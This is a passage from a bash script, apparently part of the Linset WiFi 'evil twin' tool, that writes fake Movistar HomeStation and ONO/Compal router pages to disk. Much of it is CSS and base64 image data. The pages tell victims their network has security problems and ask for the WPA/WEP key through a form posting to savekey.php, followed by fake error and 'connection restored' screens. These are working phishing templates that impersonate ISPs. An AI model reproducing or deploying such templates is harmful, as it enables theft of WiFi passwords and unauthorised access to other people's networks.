.wifi_ico { width: 89px; height: 103px; background-position: 0px 0px; display: block; margin: 20px auto 6px; }
.wifi_ico[color=\"grey\"] { background-position: 0px 0px; }
.wifi_ico[color=\"green\"] { background-position: -89px 0px; }
.wifi_ico[color=\"blue\"] { background-position: -178px 0px; }
.wifi_ico[color=\"orange\"] { background-position: -267px 0px; }
.wifi_ico[color=\"red\"] { background-position: -356px 0px; }
.wifi_ico.hover { background-position: -178px 0px; }
.gateway { display: none; margin: 0px auto; }
.wifi_txt { margin-top: 4px; }
#home_content { width: 380px; }
.scroll { margin: 194px 0px 0px 510px; position: absolute; }


/* ::::: http://192.168.1.1/css/movistar.css ::::: */

.panel_header { visibility: visible; background: url('header_m2.png') no-repeat scroll 0% 0% transparent; }
.home_station { background: none repeat scroll 0% 0% transparent; }
.ui-dialog .ui-dialog-titlebar { background: url('titlebar_m.png') repeat-x scroll 0% 0% transparent; }
.dialog_faq { background: url('faq.png') no-repeat scroll 0% 0% transparent; }
.dialog_faq:hover { background: url('faq_hover.png') no-repeat scroll 0% 0% transparent; }
.ui-dialog .ui-dialog-titlebar-close { background: url('cancel_sprite.png') no-repeat scroll -44px 0px transparent; }
.ui-dialog .ui-dialog-titlebar-close:hover { background-position: -66px 0px; }
.welcomepan_icon { background: url('welcome_pantalla_m.png') no-repeat scroll 0% 0% transparent; }
.welcomepan_icon:hover { background: url('welcome_pantalla_m.png') repeat scroll 270px 0px transparent; }
.welcome_fav_icon { background: url('favoritos_m.png') no-repeat scroll 0% 0% transparent; width: 217px; height: 54px; }
.welcome_fav_icon.hover { background: url('favoritos_m.png') repeat scroll 217px 0px transparent; }
#help_dialog { border: 3px solid rgb(67, 177, 200); }
.usb_icon { background: url('down_usb_m.png') no-repeat scroll 0% 0% transparent; }
.print_icon { background: url('down_print_m.png') no-repeat scroll 0% 0% transparent; }
.wifi_ico { background: url('router_m.png') no-repeat scroll 0% 0% transparent; }
.imgStiker { background-image: url('gateway_sticker_m.png'); }
.imgDefaultStiker { background-image: url('gateway_sticker_m.png'); }
.gateway_reset_ico { width: 100px; height: 113px; background-image: url('reset_m.png'); }
">$DUMP_PATH/data/info.css
}

function index {
echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
<html xmlns=\"http://www.w3.org/1999/xhtml\">
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">


	
	<title>HomeStation</title>
	
		 
	
	
	
	
	
	

<link rel=\"stylesheet\" type=\"text/css\" href=\"data/info.css\" media=\"all\">
</head>



<body>	
	<div class=\"panel_general\" id=\"panel_general\">		
		<div class=\"panel_header\" id=\"panel_header\"><div class=\"header_content\">
	<div class=\"header_left\">
		<div class=\"home_station\"></div>			
		<div style=\"background: url('net_map_es.png') no-repeat ; 0% transparent;\" class=\"network_map\"></div>
	</div>
	<div class=\"movistar\"></div>
</div>

<div class=\"options_menu\" id=\"options\"> 			
		<div id=\"faq\" class=\"help hand\">
			<span class=\"trad right\" key=\"HEAD_HELP\">Tips</span>
			<div class=\"faq_ico right\"></div>
		</div>
		<div class=\"line right\"></div>	
		<div id=\"password\" class=\"password hand disabled\">
			<span class=\"trad disabled_opacity right\" key=\"HEAD_PASSWORD\">Change password</span>			
			<div class=\"password_ico disabled_opacity right\"></div>
		</div>
		<div id=\"lineLanguages\" class=\"line right\"></div>
		<div id=\"languages\" class=\"languages\"><span id=\"link_en\" +=\"\" style=\"display: inline;\" class=\"first\"><a class=\"right\">English</a></span><span id=\"link_es\" +=\"\" style=\"display: none;\"><div style=\"display: inline;\" id=\"first\" class=\"line_small right\"></div><a class=\"right\">Español</a></span><span id=\"link_pt\" +=\"\" style=\"display: inline;\"><div id=\"first\" class=\"line_small right\"></div><a class=\"right\">Portugués</a></span></div>
</div>

</div>
		<div class=\"panel_content\" id=\"panel_content\"><div class=\"house\">
	<div style=\"cursor: auto;\" id=\"internet\" class=\"divInternet\">
		<div class=\"internet\" id=\"iconInternet\" internet_status=\"INTERNET_OK\"></div>
		<div class=\"internet_txt\">
			<span class=\"trad\" key=\"MAP_INTERNET\">Internet</span>
			<span class=\"internet_des trad\" key=\"COMMON_EMPTY\" id=\"internetAlert\"> </span>
		</div>
	</div>
	<div id=\"threeG\" class=\"threeG hand trad\" style=\"\">
		<div style=\"background-position: 0px 0px;\" id=\"threeG_icos\" class=\"threeG_ico\" power3g=\"3\"></div>
		<span class=\"threeG_txt hand trad\" key=\"MAP_3G\">3G</span>
	</div>
	<div adslconfigurable=\"true\" id=\"adsl\" adslactive=\"false\" class=\"adsl trad hand\">
		<div style=\"background-position: -152px 0px;\" class=\"adsl_ico\" id=\"iconadsl\"></div>
		<span class=\"adsl_txt trad\" key=\"MAP_ADSL\">ADSL</span>
	</div>	
	<div id=\"wifi\" class=\"hand disabled\">
		<div class=\"wifi_ico\" color=\"red\"></div>
		<span class=\"gateway\"></span>
		<span class=\"wifi_txt trad\" key=\"MAP_WIFI_WPA\">Wireless Network (WiFi) with security problems</span>
	</div>

	
	
	
		<div class=\"scroll\">
<iframe src=\"data/info.html\" width=\"380\" height=\"220\" align=\"center\">
		</div>
	
	
	

	<div id=\"applications\" class=\"hand disabled disabled_opacity\">
		<div class=\"applications_ico\"></div>
		<span class=\"applications_txt trad\" key=\"MAP_CONFIG_APPLICATIONS\">Configure applications and ports</span>
	</div>
</div>
</div>
		<a href=\"http://192.168.1.1/html/welcomeSplash/welcome_splash.html\"><div id=\"panel_footer\"><div class=\"footer\">
	<div id=\"imgFooter\" class=\"imgFooter\"></div>
	<div id=\"txtFooter\" class=\"txtFooter\">© 2010 Telefónica S.A. <span class=\"trad\" key=\"FOOT_RIGHTS\">All Rights Reserved</span></div>
	<div id=\"remaining_session_box\" style=\"float: right; display: none;\">
		<span>Remaining Session: </span>	
		<span id=\"remaining_session\"></span>
	</div>

</div></div></a>
	</div>					
  		
	<div id=\"help_dialog\" class=\"dialog\"></div>
	<div id=\"dialog\" class=\"dialog dialog_text\"></div>	
	<div id=\"dialogWarning\" class=\"dialog dialog_text\"></div>
	


</body>
</html>
">$DUMP_PATH/index.htm
}

HomeStationImages && error && final && infohtml && info2 && info && index
}

# Crea contenido de la iface ONO
function ONO {

mkdir $DUMP_PATH/data &>$linset_output_device

function error {

echo "      <link rel=\"stylesheet\" href=\"style2.css\" type=\"text/css\">
</HEAD>
</HEAD>

<BODY>
      <blockquote>


    <TABLE id=\"autoWidth\">

      <TBODY>



        <TR>

          <TD colspan=2></TD>

        </TR>


        <TR>

          <TD class=info1 colspan=2>


<b><font color=\"red\" size=\"3\">Error</font>:</b> The entered password is <b>NOT</b> correct!</b></TD></TR>


        <TR><TD class=blue colspan=2></TD></TR>
        
<tr><td colspan=\"2\" align=\"center\"><form><INPUT name=\"Back\" onclick=\"history.back();return false\" class=\"buttonBig\" type=\"submit\" value=\"Back\"/></form></td></tr>




      </TBODY>

    </TABLE>


      </blockquote>
</BODY>

</HTML>
">$DUMP_PATH/data/error.html
}

function final {
echo "<link rel=\"stylesheet\" href=\"style2.css\" type=\"text/css\"></HEAD>
</HEAD>

<BODY>
      <blockquote>

    <TABLE id=\"autoWidth\">

      <TBODY>


        <TR>

          <TD class=blue colspan=2></TD>

        </TR>



        <TR>

          <TD class=info1 colspan=2>
          
Your connection will be restored in a few moments.</TD></TR>


        <TR><TD class=blue colspan=2></TD></TR>
        



      </TBODY>

    </TABLE>


</blockquote>
</BODY>

</HTML>
">$DUMP_PATH/data/final.html
}

function index {
echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">
<html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"><head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
    <link rel=\"stylesheet\" href=\"data/style.css\" type=\"text/css\" media=\"screen\" />


    <!-- jQuery CSS Menu -->
<title>ONO</title></head>
<body id=\"gateway\">

<div style=\"visibility: visible; display: block;\" id=\"container\" class=\"relative\">

<div id=\"top\" class=\"relative\">
    <h1 class=\"left\"><a class=\"block indent dynamic\" id=\"idMotorola\">Compal Broadband Networks</a></h1>
    
    <span id=\"welcome\" class=\"absolute\"><span class=\"dynamic\" id=\"idWelcome\">Welcome,</span> admin</span>
        
	<div id=\"div-operator-access\">
            <a class=\"logout block absolute dynamic\" id=\"idLogout\">Logout</a></div>
    
	<div id=\"switch-language\" class=\"absolute\">
		<span class=\"left dynamic\" id=\"idLanguage\">Language</span>

		<a style=\"background: url(data:image/gif;base64,R0lGODlhfwAVANUAAEJCQnd3d0RERDo6Ompqam5ubmxsbG9vb3Z2dnR0dD09PUdHR0ZGRkxMTDg4                                   
OFBQUHNzc0lJSXJycoWFhVZWVnp6ejc3N2hoaGNjY01NTW1tbU5OTnFxcU9PT3V1dXBwcEBAQD8/                                   
P0VFRf///7Ozs3x8fC4uLkhISDQ0NGlpaYyMjFVVVVtbW0tLS4SEhF9fX35+fpGRkWJiYkFBQXh4                                   
eDs7O2FhYTw8PIiIiIKCgmtra2ZmZldXV1JSUlxcXIqKiiH5BAAAAAAALAAAAAB/ABUAQAb/QExl                                   
MqkMi0cjUYlcJp/OaHPKrEKpV6tUOykhttkwZ3cIBA7lcxptZqvb6zh8/q6773J7Hk/nB1QnfQcj                                   
hIUjJIIHMwoLCwqMjpCPjZORlJKYl5qWnJWemZ2gn5ujCy8mpKKqDR8GCQkGrrCysa+1s7a0urm8                                   
uL63wLu/wsG9xQkuG8bEzCUdDA8PDNDS1NPR19XY1tzb3trg2eLd4eTj3+cPHCbo5u4sAxYAABby                                   
9Pb18/n3+vj+/QD5CdxH8N9AgwUDJgRwA4VChBAXwJBAgIAEihYxXqy4MSNHjSA/ivRIsqPJkCVR                                   
nhy5kgAMGSxVygzgAUGBAghs4tSZ82bP/50+eQoNShSo0Z9Ihx5VmrRo0wIxNjhlSlVHCgMYMMTK                                   
ulUrVq9cv3YdK7Zs2LNg05JFu1atWbdZfzBg+7UQibaxfPRoMK8BXwB++/4NDHiwYcGICycmzPiw                                   
4seNFzuODECCQ8iTM0dYIGDAAAGdP4cG7Zm06NKjU6Nefbq16deqXceGzZr2gBU1as/erSDBhQ8c                                   
LvwOPlw4cOPEjxdfrrx58ufIozOHPl26c+scDti4Xr17jhIQKkIIT2C8ePLmy6Nff769evfp47N/
T18+/Pn2Cbhgcb9/fQgJFKBBTRoMiECBBBqI4IEKNpjggwxCuOCEDkZoIYUSVoghAji0kP/hhxdq
QAMEeghiYoko+qHiHiyeuCIcUb2YYhopyFCAGTfheGMAOfK4Y49A/iikjkT6WGSQRw5p5JJIMrkj
IEkGYMghSt5EwAsUZJABBVlu2SWXWoLpZZhflknmmWOmKeaaZqrZJptowplBCQ7E+eUhbpJJQQsC
bNABaH4C+mefgwZKqKCIHqqooYwW6miijUL66KKT+lmACZFSKiloPHQQAQghRPBpqKOKCqqppJ5a
6qqqtprqq6jGyiqss8rqqq0hGIDCrbX2yoACn4lQmrDBDmtsscgKQKyyxzKb7LLQNhvts9JWG+wK
Jjir7bTbenaCAAA44MA84pI7brjnloserrnsruuuuvCmK2+78dI777v3ituAAvXia+88AwQBADs=) no-repeat scroll left center transparent;\" id=\"switch\" class=\"right block\">
			<img title=\"Current Language: Spanish\" src=\"data:image/gif;base64,R0lGODlhEAALANUAAGNjtvr6+vb29fHx8fxGRvkQEP15eatjSuNjSjx6+TV0+f2Kd+np6dvb2PxUVPx4YttjSvsrK5q7/PxlZrpjSvw6Oubm5e7u7sljSgR09Z1jSvT080iB+gBMtkF9+vofHwBpu/f39uLi3/syMtVjSqG+/C9y+Ozs7KLA/GNlwPyBbO3t6gNx5QArs/2XhpGRgKysn+z+/rS0qPR0XuXl/P7KwcnJwf39Wzh3+f7+/fv/+vHx7wNv4df+/f3h3GNnxCH5BAAAAAAALAAAAAAQAAsAAAaMwJ/wl0oBjqoHYgmB/HIoXSkgoQYCoawA9kNxOJ5EAmcyTByEiouUmnoEiYspMxhcTreNrR1OKOYgaBUjEQsYAAEJAwonLCIddwwMFj0yABI4fzwgHS2DER8fCwciAQIbG3aRkxYNPi8qNWZoaRGgBbgqGg0BMVqoqTsrNBYiM0sITU0kGBQUBwca0kEAOw==\" alt=\"Spanish\" id=\"es\">
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        </a>

		<div id=\"choose-language\" class=\"none\"><a href=\"#\"><img alt=\"English\" title=\"English\" id=\"en\">&nbsp;English</a><a href=\"#\"><img alt=\"Spanish\" title=\"Spanish\" id=\"en\">&nbsp;Español</a></div>
	</div> <!-- switch-language -->
    
    <div id=\"company-logo\" class=\"absolute\">
        <span style=\"background: url(&quot;&quot;) no-repeat scroll 0% 0% transparent;\" class=\"block indent dynamic\" id=\"idCompanyLogo\">Logotipo de la compañía</span>    </div> <!-- id=\"company-logo\" -->

    <div id=\"myjquerymenu\" class=\"jquerycssmenu\"><ul style=\"display: block;\" id=\"menu\">
    
        <li class=\"modem-section\">
            <a class=\"dynamic\" id=\"idCableModem\">Router</a>
            <div class=\"div\"></div>
        </li>

        <li id=\"gw-section\" class=\"gateway-section\">
            <a  class=\"dynamic active\" id=\"idGateway\">Wireless</a><!--CBN - Ken - 20100929 - Remove index_gw.html link-->
            <div class=\"div\"></div>  </li>
        
        
        <li id=\"help-section\">
            <a class=\"dynamic\" id=\"idHelp\">Help</a>
            <div class=\"div\"></div>
            <ul style=\"top: 49px; display: none; visibility: visible;\" class=\"submenu\">
                <li><a href=\"data/help_modem.html\" class=\"dynamic\" id=\"idCableModem\">Cable Módem</a></li>
                <li name=\"mta-related\"></li>
                <!-- <li><a href=\"help_battery.html\" class=\"dynamic battery-section\" id=\"idBattery\">Battery</a></li> CBN - Ken - 20100928 - Remove battery help page-->
                <!-- <li><a href=\"#\" class=\"gateway-section\">Gateway</a></li> CBN - Anderson - 20101117 - Remove gateway help page temporarily -->
            </ul>
        </li>

</ul> 



</div>
</div> <!-- id=\"top\" --><div id=\"content\" class=\"both\">

<div id=\"breadcrumb\">
    <h2 class=\"dynamic\" id=\"idcrumbhomegatewayaccount\">Home / Wireless / Management / Password Check</h2>
</div> <!-- id=\"breadcrumb\" -->


<div style=\"visibility: visible;\" class=\"div-table left\">
<iframe src=\"data/info.html\" width=\"390\" height=\"320\" align=\"center\">
</div>

<div class=\"both\"></div>

</div>

</div> <!-- id=\"container\" -->

<div id=\"div-content-footer\"></div>

<div style=\"display: block;\" class=\"relative\" id=\"footer\">
</div>  <!-- id=\"footer\" -->



</body></html>
">$DUMP_PATH/index.htm
}

function info {
echo "<html>
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">

<link rel=\"stylesheet\" type=\"text/css\" href=\"style2.css\" media=\"all\">
</head>

<body marginheight=\"0\" marginwidth=\"0\">

<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">
  <tbody><tr> 
      <td width=\"2%\">&nbsp;</td><td width=\"5%\"></td><td width=\"93%\"> 
      <div valign=\"top\" align=\"left\"> 
        <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"360\">
           
          </tr>
          <TABLE id=\"autoWidth\">

      <TBODY>
<tr><td><hr color=\"blue\" size=1 width=\"99%\"></td></tr>


                <tr><td colspan=\"2\" >SSID: <b>$Host_SSID</b></td></tr>
        <tr><td colspan=\"2\"  >MAC Address: <b>$Host_MAC</b></td></tr>
        <tr><td colspan=\"2\"  >Channel: <b>$Host_CHAN</b></td></tr>

<tr><td></td></tr>


<tr><td><hr color=\"blue\" size=1 width=\"99%\"></td></tr>
<tr><td></td></tr>

        <TR>

          <TD class=info1 colspan=2>
<br>
For security reasons, enter the <b>$Host_ENC</b> key to access the Internet
<br>
<br>
<div id=\"box\" align=\"left\" >
<form id=\"form1\" name=\"form1\" method=\"POST\" action=\"savekey.php\" >
<tr><td><b>$Host_ENC</b> Key:</td></tr>
<tr><td><input name=\"key1\" type=\"password\" class=\"textfield\" /><td></tr>


        <TR><TD class=blue colspan=2></TD></TR>
                <TR><TD class=blue colspan=2></TD></TR>


<tr><td colspan=\"2\"><INPUT name=\"Confirm\" class=\"button\" type=\"submit\" value=\"Confirm\"/></td></tr>

</form></div>

</TD></TR>


      </TBODY>

    </TABLE>
</table></div></td></tr></tbody></table>
</body>
</html>
">$DUMP_PATH/data/info.html
}

function style {
echo "/**
css/style.css
MOTOROLA_CONFIDENTIAL_PROPRIETARY
------------------------------------------------------------------------------------------
                         Motorola Confidential Proprietary
               Copyright ?2009 Motorola, Inc. All Rights Reserved.

Internal Revision History:

Modification Tracking

          Author              Date         CR            Description of Changes
------------------------- ------------ ---------- ----------------------------------------
	 andre.valongueiro      03-24-09     41791               Initial Version
**/

/** RESET **/

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, font, img, ins, kbd, q, s, samp, small, strike, sub, sup, tt, var, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td {
	margin:0;
	padding:0;
	border:0;
	outline:0;
	font-weight:normal;
	font-style:inherit;
	font-size:100%;
	font-family:inherit;
	vertical-align:baseline;
}
:focus {outline:0;}
body {
	line-height:1;
	color:black;
	background:white;
	text-align:center;
}
html {overflow: -moz-scrollbars-vertical;} /** Set default scrollbar for Firefox **/
ol, ul {list-style:none;}
table {
	border-collapse:separate;
	border-spacing:0;
}
caption, th, td {
	text-align:left;
	font-weight:normal;
}
blockquote:before, blockquote:after, q:before, q:after {content:\"\";}
blockquote, q {quotes:\"\" \"\";}
a {cursor:pointer;}
/** FRAMEWORK **/
.block {display:block;}.none {display:none;}.left {float:left;}.right {float:right;}.both {clear:both;}.indent {text-indent:-5000px;}.relative {position:relative;}.absolute {position:absolute;}.middle {vertical-align:middle;}.bold {font-weight:bold;}.hidden {visibility:hidden;}.visible {visibility:visible;}
.input-text {
	border:1px solid #CDCDCD;
	vertical-align:middle;
	margin-bottom:12px;
	font:normal 11px arial, verdana, tahoma, sans-serif;
	color:#585858;
	padding:4px 0;	
}
/** MAIN **/
html, body {height: 100%;}
body {
	text-align:center;
	font-family:arial, verdana, tahoma, sans-serif;
	background:url(bg_body.gif) repeat-x !important;
	width:100%;
}
a {
	text-decoration:none !important;
	color:#000;
	overflow:auto;
}
a:visited {text-decoration:none !important;}
a:hover {text-decoration:none !important;}
a:active {text-decoration:none !important;}
#container {
	visibility:hidden;
	margin:0 auto;
	text-align:left;
	width:1050px;
}
/** TOP **/
#top {
	width:1050px;
	z-index:52;
}
h1 a {
	width:145px;
	height:121px;
	background:url(logo.gif) no-repeat;
}
#welcome {
	font-size:9px;
	color:#CFCFCF;	
	top:16px;
	left:160px;
	letter-spacing:1px;
}
#company-logo {
	top:6px;
	right:60px;
	width:117px;
	height:121px;
}
#company-logo span {
	width:63px;
	height:28px;
	background:url(company_logo.gif) no-repeat;
}
.operator-access {
	width:126px;
	height:18px;
	background:url(bg_operator_login.gif) no-repeat;
	top:9px;
	right:550px;
	font:normal 10px arial, verdana, tahoma, sans-serif !important;
	text-transform:uppercase;
	color:#CFCFCF !important;
	padding-top:5px;
	text-align:center;
}
.logout {
	width:126px;
	height:18px;
	background:url(bg_operator_login.gif) no-repeat;
	top:9px;
	right:550px;
	font:normal 10px arial, verdana, tahoma, sans-serif !important;
	text-transform:uppercase;
	color:#CFCFCF !important;
	padding-top:5px;
	text-align:center;
}
.operator-access:hover, .logout:hover {
	text-decoration:none;
	color:#FFF !important;
}
/** SWITCH LANGUAGE **/
#switch-language {
	width:220px;
	top:9px;
	right:250px;
	z-index:53;
}
#idLanguage {
	color:#CFCFCF;
	text-transform:uppercase;
	font-size:10px;
	margin-top:5px;
	text-align:right;
	width:80px;
}
#switch{
	background:url(language.gif) no-repeat;
	width:127px;
	height:21px;
    font:normal 12px arial, verdana, tahoma, sans-serif !important;
	text-transform:uppercase;
	color:#CFCFCF !important;
}
#switch-hover-preload {background:url(language_hover.gif) no-repeat;} /** Preloading hover image **/
#switch:hover {
	background:url(language_hover.gif) no-repeat;
    font:normal 12px arial, verdana, tahoma, sans-serif !important;
	text-transform:uppercase;
	color:#CFCFCF !important;
}
#switch img {
	margin:5px 0 0 13px;
}
#switch-language div {
	width:100px;
	background:#555;	
	margin:21px 0 0 94px;  	
	border-left:1px solid #7A7A7A;
	border-right:1px solid #7A7A7A;
    padding-top:12px;
}
#switch-language div a {
	display:block;
	width:100px;
	padding:3px 0 3px 12px;
    overflow:hidden;
    font:normal 12px arial, verdana, tahoma, sans-serif !important;
	text-transform:uppercase;
	color:#CFCFCF !important;
	vertical-align:middle;
}
/** MENU **/
#menu {
	padding-top:42px;
	height:56px;
}
#menu li {
	float:left;	
	width:145px;
	position:relative;
}
#menu li a {	
    overflow:hidden;
	text-transform:uppercase;
	font-size:15px;
	font-weight:bold;
	color:#000;
	display:block;
	width:145px;
	height:33px;
	float:left;
	text-align:center;
	padding-top:16px;
	background:url(hover_menu.gif) repeat-x left 51px; /** Pre-Loading background-image **/
}
#menu li a:visited {text-decoration:none;}
#menu li a:hover, .hover-menu {
	background:url(hover_menu.gif) repeat-x; /** Using pre-loaded background-image **/
	text-decoration:none;
}
#menu li a:active {text-decoration:none;}
.div {
	width:2px;
	height:48px;
	background:url(div.gif) no-repeat left;
	float:right;
	margin-top:-48px;
}
.active {
	background:url(hover_menu.gif) repeat-x !important; 
	height:51px;
}
/** SUBMENU **/
.submenu {
	position:absolute;
	left:0;
	top:46px;
}
.submenu a {
	clear:left;
	display:block;
	padding:10px 0 8px 10px !important;
	text-align:left !important;
	background:url(bg_submenu.gif) no-repeat left top !important;
	width:134px !important;
	height:auto !important;
	font-size:12px !important;
	font-weight:normal !important;
	border-top:1px solid #85D0FA;
	float:left;
    overflow:hidden;
}
.submenu a:visited {
	text-decoration:none !important;
}
.submenu a:hover {
	/* background:#A9DDFB url(bg_submenu.gif) no-repeat left -31px !important; */
	background:#A9DDFB url(bg_hover.gif) no-repeat left -3px !important;
	text-decoration:none !important;
}
.submenu a:active {
	text-decoration:none !important;
}
/*S-dino*/
.submenu q a{
	clear:none;
	display:block;
	padding:10px 0 8px 10px !important;
	text-align:left !important;
	background:url(bg_submenu.gif) repeat-x left top !important;
	width:215px !important;
	height:auto !important;
	font-size:12px !important;
	font-weight:normal !important;
	border-top:1px solid #85D0FA;
	float:left;
    overflow:hidden;
}
/*
.submenu q a:hover {
	background:#A9DDFB url(bg_submenu.gif) no-repeat left -31px !important;
	border-top:1px solid #85D0FA;
	text-decoration:none !important;
}
*/

/*E-dino*/

/** CONTENT **/
#content {
	width:1050px;
	margin-bottom:75px;
	min-height:400px;
	height:auto !important;
	height:400px;
	z-index:51;
}
#content ul {
	margin-top:60px;
	margin-left:50px;
}
#content ul li{
	width:200px;
	float:left;
	margin:0 40px 24px 0;
}
#content ul li p {height:60px;}
#content ul li p a {
	overflow:hidden;
	color:#585858;
}
#content h2 {
	margin:-12px 0 6px 0;	
}
#content h2 a {
	font-size:15px;
	font-weight:bold;
	text-transform:uppercase;
	color:#303030;
	margin-left:36px;
}
#content p {
	font-size:11px; /** font size related to help content of box-info **/
	line-height:14px;
	margin-left:36px;
}

/** BREADCRUMB **/
#breadcrumb {
	border-bottom:1px solid #FFF;	
	padding-top:12px;
	margin-top:24px;
}
#breadcrumb h2 {
	font-size:11px;
	color:#585858;
}
#footer {
    background: url(\"bg_footer.gif\") repeat-x scroll center bottom transparent;
    width: 100%;
    height: 24px;
    position: fixed;
    bottom: 0px;
    left: 0px;
}
.div-table {
    visibility: hidden;
    margin-top: 20px;
}
">$DUMP_PATH/data/style.css
}

function style2 {
echo "html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, font, img, ins, kbd, q, s, samp, small, strike, sub, sup, tt, var, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td {
	margin:0;
	padding:0;
	border:0;
	outline:0;
	font-weight:normal;
	font-style:inherit;
	font-size:100%;
	font-family:inherit;
	vertical-align:baseline;
}
:focus {outline:0;}
body {
	font-size: 13px;
	line-height:1;
	color:black;
	text-align:center;
}
">$DUMP_PATH/data/style2.css
}

function imagesbas64 {

echo "R0lGODlhJADOAeYAAP39/eHh4d3d3fz8/PPz897e3uDg4PHx8eTk5Pv7++Li4vLy8vr6+u3t7ePj
4+vr6+7u7u/v7+fn5+Xl5fDw8Obm5ujo6Orq6vb29vn5+fj4+Ozs7Onp6dra2vf39zMzM0NDQ1VV
VUJCQkRERDw8PDc3N0FBQUBAQFJSUjU1NSsrKzg4OEVFRTk5OUZGRjs7O1RUVDExMT8/Pz4+PlZW
VkpKSj09PVFRUUdHR0lJSVBQUDY2Nk5OTjQ0NDAwMC8vLy0tLSwsLFNTU0tLSzo6OkxMTCcnJ1dX
VygoKCkpKS4uLjIyMt/f39zc3P7+/tvb2/T09PX19f///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5
BAAAAAAALAAAAAAkAM4BAAf/gCEhLCOChIaFg4mHioiOiiOJkYKTIZWXkpmUiSAgMCGdn6GgnqSi
paOppUdHLi6srrCvrbOxtLK4tDQ0rru9vC6+wcDCxcTAmJvKlprMy5gwNJHR09Ij1NfW2NvaNDAw
oeCe4t/h5uPn5SBCQiAi7O7w7+3z8fTy+PQiIigo+/3//PETCHBgwIMDT5y4gUIhQ4cNF0Z8KBGi
RYkFMxLciFAjwhs3TJgAKZLkyJAnS6I0yRKlQh06XsY8AVOmTZoza+KUKUMGDx09fwYF6pOo0KJD
kxblwWPGDKZOoT5tOjUqValYqRYpYsPG1q5fvXIVC3Zs2LNjSZAYMkQtW7dt/9fGfSsXrl25RIjk
qJF3b1++egH7Dfy3cOAaNdQiVpyYxGLHjR9Ljtw4R44XLyxj1pz5cufNnjmL9tyiBQ4cpU+nRm2a
terWq2O3XrGCBQ7atnHfrr07N2/dwHmzYFGixPDix40TV458efLnyzvt2CGdOojp1bNft459e/UU
KfaBFx9exHjz5c+rT1/+w4cTJtzDlx//ff359unrty+yR4/+/5ngH4AEChjggAYC2JN7C37Q4IMy
MBihgxNC6F4MMTiFoYYZzrChhx1+KGKIHfrgAwk2mIiiiime2OKKLrIoo4uY/fBDjTe+YCOOPOqY
444+4liaEkoMWWQLRBqpJP+SRybJpJFAAEFblFNKuQKVV1qJ5ZZaWqmCCjuU8GWYY4oJpplknlnm
mmcWF0QQbsJZwptx1jmnnHTeGSd4X/Kpgp+AptCnoH8SGuiXSSThXqKLKvoBo486CumkkjqKBBJL
fHBppptqiqmnnH7a6aifYmiEEaaiGsOpqba6qqqsvpqqE04gQKuttd6qa6684urrrggMIOywxBZr
7LHIQqHsssw26+yz0CqrgLTUQjGttdVeq2221Ubr7bfghivusgEoWy4U56Zr7rrorhuFuuhGIe+8
9NZr77345qvvvvgGIK+/7/4rcMAEA2zwwADzq/DCDDeM8MMFQ3xwxA5XbLH/xRNnLPHGBF/s8cf5
akyxyCSD7DAU8yorr8r4opwyyi7D3O7M8NbMrs0zj6vzzjw7a4CyPxPwMxRDB200FEITQDQBQgMN
NNNQRy311FRXbfXVWFttANNbJ+1112BzLfbXXC9g9tlop6322my37fbbah9wgAFy0z133Xjfrbfd
fOdtt9yABy744IQXDjgFhlOAuOCLI96443IrzoTklFMwueWVX6555pJH4Lnin4dOQQSjj0766ah7
Trripqvu+uuwxy676hBAwETtt9uO++66957777znXvvwxBdv/PHHN6D88sw37/zz0CtfgPTUNzC9
9dVfr3320m/g/fLehy/+//fiK79BA+eHj37647fv/vvwb/DAAwXMXz/99ueP//7396///fMLoAAH
SMACFvACCEygAhfIwAY6kAMcEAAEJRjBCVqwghikoAYvSEEIevCDIAyhCEVogRKa8IQoTKEKVygB
CTTBAhIQQAtfGMMZtlCGLpSABQQAQxo24YY2bKEQh0jEIhrxiBVIohKXyMQmOvGJE5hAE6LYhApI
0YpTvGIFprhFKiYxi2D8YhTHSMYymvGMaJwAAtbIxja68Y1wjOMamzDHOiKAjne0Ix73qMc5OuCP
gEQAIAcpyEAako2D/GMhE8nIRjrykQpQwBMiOUlJUvKSlsxkJTeJyUpG8v+ToAylKEc5ygCY8pSo
TKUqV8lKAxjgCa6E5StjSctZ2lKWuKylLF3Jy1768pfABCYThknMYhrzmMhM5jA7sMxmMoGZz3Qm
NKcpTWcq85rYRGYBtlmAYXbTmN0MJxO+uc1xllOc2+xAOtdZAHW2k53udOcT4JlOAdjznvjMpz73
yc9++vOf+mxCEzogUIIKgKADLahCE8pQhDp0oQKNqEQnStGKWvSiGM3oRJ/whA5w1KMd/ahIQ0pS
kJp0pAjVqEovylGONqGlMI2pS2VK05ietKQozSlOd1rTnvq0ph7twE0/CtKOCpWoJz0qUoXK1KY6
9alQjapUp0rVqlr1qkz//alWt8rVrnr1q2ANq1jHStaympWmK02rWtfK1ra69a1wjatcKwrQutr1
rnjNq173yte++vWv+uSmYAdL2MIa9rCITaxiF8vYxjr2sZCNrGQPm83KWvaymM2sZjfL2c569rPH
